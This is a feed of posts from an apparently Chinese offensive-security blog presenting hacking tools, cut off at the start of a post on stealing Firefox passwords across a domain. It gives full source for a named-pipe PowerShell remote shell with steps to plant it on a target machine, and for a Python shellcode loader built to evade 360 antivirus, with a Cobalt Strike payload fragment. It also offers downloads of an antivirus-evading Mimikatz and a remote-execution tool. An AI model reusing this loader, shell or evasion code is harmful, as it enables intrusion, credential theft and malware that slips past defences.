<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hone老帅</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="OneHone.github.io/"/>
  <updated>2020-04-21T09:28:30.130Z</updated>
  <id>OneHone.github.io/</id>
  
  <author>
    <name>Hone老帅</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mimikatz-长期免杀360版</title>
    <link href="OneHone.github.io/2020/04/21/Mimikatz-%E9%95%BF%E6%9C%9F%E5%85%8D%E6%9D%80360%E7%89%88/"/>
    <id>OneHone.github.io/2020/04/21/Mimikatz-长期免杀360版/</id>
    <published>2020-04-21T08:32:52.000Z</published>
    <updated>2020-04-21T09:28:30.130Z</updated>
    
    <content type="html"><![CDATA[<p>艺术上的小冲突<br><a id="more"></a><br>思路参考：<a href="https://www.t00ls.net/viewthread.php?tid=55524&amp;highlight=%E5%85%8D%E6%9D%80" target="_blank" rel="noopener">免杀版mimikatz - 长期使用</a>。结合之前<a href="http://hone.cool/2019/10/11/Mimikatz2-2-0%E4%B8%80%E9%94%AE%E7%89%88-%E6%98%8E%E6%96%87-krbtgt/" target="_blank" rel="noopener">一键版mimikatz</a>工具写了个长期免杀360的mimikatz。<br>时间：2020-4-21</p><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="/images/Mimikatz-长期免杀360版/1.gif" alt=""><br>运行完后，等几分钟就会被查杀，所以要及时清理（一次性工具）。</p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://github.com/OneHone/HoneTool/tree/master/Mimikatz-%E9%95%BF%E6%9C%9F%E5%85%8D%E6%9D%80360%E7%89%88" target="_blank" rel="noopener">time-1-bypass-360-by-mimi.py</a></p><h3 id="小更改"><a href="#小更改" class="headerlink" title="小更改"></a>小更改</h3><p>如被杀，自行修改代码第12行中的数字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">salt = &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 50))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;艺术上的小冲突&lt;br&gt;
    
    </summary>
    
      <category term="免杀" scheme="OneHone.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="OneHone.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>C# atexec</title>
    <link href="OneHone.github.io/2020/03/22/C-atexec/"/>
    <id>OneHone.github.io/2020/03/22/C-atexec/</id>
    <published>2020-03-22T14:30:52.000Z</published>
    <updated>2020-03-28T09:47:20.785Z</updated>
    
    <content type="html"><![CDATA[<p>平常心<br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>工具的创造思路参考impacket中的<a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/atexec.py" target="_blank" rel="noopener">atexec.py</a>,但由于其编译出来的exe体积过大、不免杀等原因，造成实际环境中无法使用。<br>atexec(c#)正是为了解决这些问题而编写的。</p><h3 id="工具原理"><a href="#工具原理" class="headerlink" title="工具原理"></a>工具原理</h3><p>通过Task Scheduler服务在目标系统上执行命令，并返回输出结果。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe -h ip -u username -p password -c command</span><br><span class="line">atexec.exe -h ip -u username -p password -d domain -c command</span><br><span class="line">atexec.exe -h ip -u username -p password -d domain -c command -s 5000</span><br></pre></td></tr></table></figure><p>程序默认休眠3s，以等待命令执行完毕。<br>殊：执行systeminfo命令，需添加命令 -s 5000或者-s 8000。不然时间太短会读不到返回结果</p><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="/images/c-atexec/1.PNG" alt=""></p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p><a href="https://raw.githubusercontent.com/OneHone/HoneTool/master/atexec/atexec.exe" target="_blank" rel="noopener">atexec</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平常心&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="OneHone.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Pipecmd-通过命名管道Pipe执行系统命令</title>
    <link href="OneHone.github.io/2019/12/27/Pipecmd-%E9%80%9A%E8%BF%87%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93Pipe%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"/>
    <id>OneHone.github.io/2019/12/27/Pipecmd-通过命名管道Pipe执行系统命令/</id>
    <published>2019-12-27T05:44:44.000Z</published>
    <updated>2020-03-18T13:44:23.057Z</updated>
    
    <content type="html"><![CDATA[<p>老许，你要老婆不要。<br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文章不写命名管道的定义及原理，只谈利用。如对windows命名管道不了解的，可阅读文章<a href="https://www.anquanke.com/post/id/190207#h2-0" target="_blank" rel="noopener"><font color="#dd0000">Windows 命名管道研究初探</font></a></p><h3 id="C-Pipecmd编写"><a href="#C-Pipecmd编写" class="headerlink" title="C#-Pipecmd编写"></a>C#-Pipecmd编写</h3><h4 id="适用场景："><a href="#适用场景：" class="headerlink" title="适用场景："></a>适用场景：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">机器之间只存在单向SMB通讯。</span><br><span class="line">连接IPC后，弹回该机器的shell。</span><br></pre></td></tr></table></figure><h4 id="PipeServer服务端实现"><a href="#PipeServer服务端实现" class="headerlink" title="PipeServer服务端实现"></a>PipeServer服务端实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO.Pipes;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">namespace</span> PipeServer</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(<span class="built_in">string</span>[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            UTF8Encoding encoding = <span class="keyword">new</span> UTF8Encoding();</span><br><span class="line">            Decoder decoder = Encoding.UTF8.GetDecoder();</span><br><span class="line">            byte[] ByteCmd = <span class="keyword">new</span> byte[<span class="number">2048</span>];</span><br><span class="line">            <span class="keyword">char</span>[] chars = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="keyword">int</span> numBytes;</span><br><span class="line">            NamedPipeServerStream Pipserver = <span class="keyword">new</span> NamedPipeServerStream(<span class="string">"servers"</span>,  PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances,  PipeTransmissionMode.Message);</span><br><span class="line">            &#123;</span><br><span class="line">                Pipserver.WaitForConnection();</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">string</span> command = <span class="string">""</span>;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        numBytes = Pipserver.Read(ByteCmd, <span class="number">0</span>, ByteCmd.Length);</span><br><span class="line">                        <span class="keyword">int</span> numChars = decoder.GetChars(ByteCmd, <span class="number">0</span>, numBytes, chars,  <span class="number">0</span>);</span><br><span class="line">                        command += <span class="keyword">new</span> <span class="built_in">string</span>(chars, <span class="number">0</span>, numChars);</span><br><span class="line">                    &#125; <span class="keyword">while</span> (!Pipserver.IsMessageComplete);<span class="comment">//while  (string.IsNullOrEmpty(command));</span></span><br><span class="line">                    decoder.Reset();</span><br><span class="line">                    <span class="keyword">if</span> (command.ToLower() == <span class="string">"exit"</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    Runspace runspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">                    runspace.Open();</span><br><span class="line">                    Pipeline pipeline = runspace.CreatePipeline();</span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        pipeline.Commands.AddScript(command);</span><br><span class="line">                        var results = pipeline.Invoke();</span><br><span class="line">                        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                        foreach (PSObject result in results)</span><br><span class="line">                        &#123;</span><br><span class="line">                            sb.AppendLine(result.ToString());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (!String.IsNullOrEmpty(sb.ToString()))</span><br><span class="line">                        &#123;</span><br><span class="line">                            var response = Encoding.Default.GetBytes(sb.ToString());</span><br><span class="line">                            Pipserver.Write(response, <span class="number">0</span>, response.Length);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">string</span> Null = <span class="string">"Command execution completed"</span>;</span><br><span class="line">                            var response = Encoding.Default.GetBytes(Null);</span><br><span class="line">                            Pipserver.Write(response, <span class="number">0</span>, response.Length);</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">string</span> Error = <span class="string">"The Command is not supported"</span>;</span><br><span class="line">                        var response = Encoding.Default.GetBytes(Error);</span><br><span class="line">                        Pipserver.Write(response, <span class="number">0</span>, response.Length);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PipeClient客户端实现"><a href="#PipeClient客户端实现" class="headerlink" title="PipeClient客户端实现"></a>PipeClient客户端实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.IO.Pipes;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">namespace</span> PipeClient</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(<span class="built_in">string</span>[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            UTF8Encoding encoding = <span class="keyword">new</span> UTF8Encoding();</span><br><span class="line">            Decoder decoder = Encoding.UTF8.GetDecoder();</span><br><span class="line">            byte[] response = <span class="keyword">new</span> byte[<span class="number">2048</span>];</span><br><span class="line">            <span class="keyword">char</span>[] chars = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="keyword">int</span> numBytes;</span><br><span class="line">            NamedPipeClientStream PipClient = <span class="keyword">new</span> NamedPipeClientStream(args[<span class="number">0</span>],  <span class="string">"servers"</span>, PipeDirection.InOut);</span><br><span class="line">            &#123;</span><br><span class="line">                PipClient.Connect();</span><br><span class="line">                PipClient.ReadMode = PipeTransmissionMode.Message;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.Write(<span class="string">"PipeCmd&gt; "</span>);</span><br><span class="line">                    var StringCmd = Console.ReadLine();</span><br><span class="line">                    <span class="keyword">if</span> (String.IsNullOrEmpty(StringCmd)) <span class="keyword">continue</span>;</span><br><span class="line">                    var ByteCmd = Encoding.Default.GetBytes(StringCmd);</span><br><span class="line">                    PipClient.Write(ByteCmd, <span class="number">0</span>, ByteCmd.Length);</span><br><span class="line">                    <span class="keyword">if</span> (StringCmd.ToLower() == <span class="string">"exit"</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">string</span> Command = <span class="string">""</span>;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        numBytes = PipClient.Read(response, <span class="number">0</span>, response.Length);</span><br><span class="line">                        <span class="keyword">int</span> numChars = decoder.GetChars(response, <span class="number">0</span>, numBytes, chars,  <span class="number">0</span>);</span><br><span class="line">                        Command += <span class="keyword">new</span> <span class="built_in">string</span>(chars, <span class="number">0</span>, numChars);</span><br><span class="line">                    &#125; <span class="keyword">while</span> (!PipClient.IsMessageComplete);</span><br><span class="line">                    decoder.Reset();</span><br><span class="line">                    Console.WriteLine(Command);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用说明："><a href="#使用说明：" class="headerlink" title="使用说明："></a>使用说明：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本机：</span><br><span class="line">第一步：运行PipeServer.exe</span><br><span class="line">第二步：运行PipeClient.exe 127.0.0.1，进入pipecmd命令行模式，exit命令退出程序。</span><br><span class="line">远程：</span><br><span class="line">第一步：IPC连接目标机（确保有权限访问该机器的管道）</span><br><span class="line">第二步：在目标机运行PipeServer.exe（可用at、schtasks、sc、PsExec</span><br><span class="line">wmic等执行）</span><br><span class="line">第三步：运行PipeClient.exe IpcIp 进入pipecmd命令行模式，exit命令退出程序。</span><br></pre></td></tr></table></figure><h4 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h4><p>服务端Server在本地创建一个名为<code>servers</code>的pipe管道，客户端Client访问该管道进行通讯，服务端Server接受到客户端Client发出的命令之后将调用System.Management.Automation.dll执行powershell命令，并将执行结果返回到客户端Client，客户端接受到结果后显示，并等待下一次命令发出。</p><h4 id="本地效果图"><a href="#本地效果图" class="headerlink" title="本地效果图"></a>本地效果图</h4><p><img src="/images/Pipecmd-通过命名管道Pipe执行系统命令/1.gif" alt=""></p><h4 id="远程效果图"><a href="#远程效果图" class="headerlink" title="远程效果图"></a>远程效果图</h4><p><img src="/images/Pipecmd-通过命名管道Pipe执行系统命令/2.gif" alt=""></p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p>编译环境炸了，晚点补上。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;老许，你要老婆不要。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="OneHone.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="C#" scheme="OneHone.github.io/tags/C/"/>
    
      <category term="Pipe" scheme="OneHone.github.io/tags/Pipe/"/>
    
  </entry>
  
  <entry>
    <title>C#免杀Shellcode加载器</title>
    <link href="OneHone.github.io/2019/11/26/%E5%85%8D%E6%9D%80-C-Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>OneHone.github.io/2019/11/26/免杀-C-Shellcode加载器/</id>
    <published>2019-11-26T02:42:33.000Z</published>
    <updated>2019-11-27T11:51:26.151Z</updated>
    
    <content type="html"><![CDATA[<p>我的船可是出了名的快啊。<br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一个月前写的工具，考虑到之前用python免杀体积有点大，所以这次用.net写了个。免杀360（2019.11.26） 其他杀软自行测试。</p><h3 id="免杀原理"><a href="#免杀原理" class="headerlink" title="免杀原理"></a>免杀原理</h3><p>Shellcode base64加密</p><h4 id="payload制作"><a href="#payload制作" class="headerlink" title="payload制作"></a>payload制作</h4><p>以Cs为演示：payload。payload Generator –&gt;Output C#</p><h5 id="shellcode-Base64加密"><a href="#shellcode-Base64加密" class="headerlink" title="shellcode Base64加密"></a>shellcode Base64加密</h5><p>将shellcode替换下述第三行代码中<br><code>base64Encode.py</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">bs64=base64.b64encode(&quot;0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89....&quot;)</span><br><span class="line">print bs64</span><br></pre></td></tr></table></figure></p><p>运行<code>base64Encode.py</code>得到加密shellcode</p><h3 id="加载器执行shellcode"><a href="#加载器执行shellcode" class="headerlink" title="加载器执行shellcode"></a>加载器执行shellcode</h3><p>使用说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode.exe ShellcodeBase64</span><br></pre></td></tr></table></figure></p><p>源码找不到，就不贴了。后续版本看情况发布。</p><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><p><img src="/images/免杀Shellcode加载器/1.gif" alt=""><br><img src="/images/免杀Shellcode加载器/1.PNG" alt=""><br>下载地址：<a href="https://github.com/OneHone/C--Shellcode" target="_blank" rel="noopener">https://github.com/OneHone/C–Shellcode</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我的船可是出了名的快啊。&lt;br&gt;
    
    </summary>
    
      <category term="免杀" scheme="OneHone.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="OneHone.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Python免杀ShellCode加载器</title>
    <link href="OneHone.github.io/2019/10/22/Python%E5%85%8D%E6%9D%80ShellCode%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>OneHone.github.io/2019/10/22/Python免杀ShellCode加载器/</id>
    <published>2019-10-22T02:42:33.000Z</published>
    <updated>2020-03-18T13:44:40.061Z</updated>
    
    <content type="html"><![CDATA[<p>给阿姨倒杯卡布奇诺<br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近阅读K8哥哥写的<a href="https://www.cnblogs.com/k8gege/p/11223393.html" target="_blank" rel="noopener">shellcode加载器文章</a>时发现他的工具已经被杀了，于是自己修改了下源码。<br>目前免杀360（2019-10.22），别的杀软自行测试。</p><h3 id="免杀原理"><a href="#免杀原理" class="headerlink" title="免杀原理"></a>免杀原理</h3><p>将shellcode转成hex，然后通过加载器执行shellcode</p><h4 id="payload制作"><a href="#payload制作" class="headerlink" title="payload制作"></a>payload制作</h4><p>这里选择Cs（Msf）生成标准C格式的payload。payload Generator –&gt;Output C</p><h5 id="shellcode转hex"><a href="#shellcode转hex" class="headerlink" title="shellcode转hex"></a>shellcode转hex</h5><p>将上述生成的payload替换到<code>char2hex.py</code>第四行代码中，运行生成hex格式的payload。<br>char2hex.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># char2hex By Hone老帅</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">char = &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac&quot;</span><br><span class="line">print char.encode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure></p><h4 id="加载器执行shellcode"><a href="#加载器执行shellcode" class="headerlink" title="加载器执行shellcode"></a>加载器执行shellcode</h4><p>加载器执行hex格式的shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用方式：shellcode.exe hex</span><br></pre></td></tr></table></figure></p><p>shellcode.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># shellcode By Hone老帅</span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">decode = sys.argv[1].decode(&quot;hex&quot;)</span><br><span class="line">n=random.randint(0,len(decode)-1)</span><br><span class="line">shellcode = bytearray(decode[:n]+decode[n:])</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure></p><h5 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h5><p><img src="/images/Python免杀ShellCode加载器/1.gif" alt=""><br><img src="/images/Python免杀ShellCode加载器/1.PNG" alt=""></p><h3 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h3><p>上述的加载器代码是对shellcode进行随机分割处理，然后把分割好的两部分拼接起来。同样的，也可以对shellcode进行打乱、替换、运算处理、base64加密、异或等等，最后把shellcode还原，达到免杀目的。<br>下载地址：<a href="https://github.com/OneHone/Py-Shellcode" target="_blank" rel="noopener">https://github.com/OneHone/Py-Shellcode</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;给阿姨倒杯卡布奇诺&lt;br&gt;
    
    </summary>
    
      <category term="免杀" scheme="OneHone.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="OneHone.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Mimikatz2.2.0一键版-明文&amp;krbtgt</title>
    <link href="OneHone.github.io/2019/10/11/Mimikatz2-2-0%E4%B8%80%E9%94%AE%E7%89%88-%E6%98%8E%E6%96%87-krbtgt/"/>
    <id>OneHone.github.io/2019/10/11/Mimikatz2-2-0一键版-明文-krbtgt/</id>
    <published>2019-10-11T15:22:58.000Z</published>
    <updated>2019-10-24T16:09:22.888Z</updated>
    
    <content type="html"><![CDATA[<p>一键版完全是为了方便，本程序由<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">GitHub</a>源码改编而成，不免杀。<br><a id="more"></a></p><h2 id="明文效果图"><a href="#明文效果图" class="headerlink" title="明文效果图"></a>明文效果图</h2><p><img src="/images/Mimikatz一键版-明文&amp;krbtgt/1.gif" alt=""></p><h2 id="krbtgt效果图"><a href="#krbtgt效果图" class="headerlink" title="krbtgt效果图"></a>krbtgt效果图</h2><p>域渗透中定期获取krbtgt用户的hash是必不可少的操作。<br><img src="/images/Mimikatz一键版-明文&amp;krbtgt/2.gif" alt=""><br>下载地址：<a href="https://github.com/OneHone/HoneTool/tree/master/Mimikatz2-2-0%E4%B8%80%E9%94%AE%E7%89%88-%E6%98%8E%E6%96%87-krbtgt" target="_blank" rel="noopener">https://github.com/OneHone/HoneTool/tree/master/Mimikatz2-2-0%E4%B8%80%E9%94%AE%E7%89%88-%E6%98%8E%E6%96%87-krbtgt</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一键版完全是为了方便，本程序由&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;源码改编而成，不免杀。&lt;br&gt;
    
    </summary>
    
      <category term="工具" scheme="OneHone.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="OneHone.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>批量IPC获取域内机器Firefox密码和历史记录</title>
    <link href="OneHone.github.io/2019/09/06/%E6%89%B9%E9%87%8FIPC%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%9C%BA%E5%99%A8Firefox%E5%AF%86%E7%A0%81/"/>
    <id>OneHone.github.io/2019/09/06/批量IPC获取域内机器Firefox密码/</id>
    <published>2019-09-06T14:16:04.000Z</published>
    <updated>2019-10-24T15:49:30.942Z</updated>
    
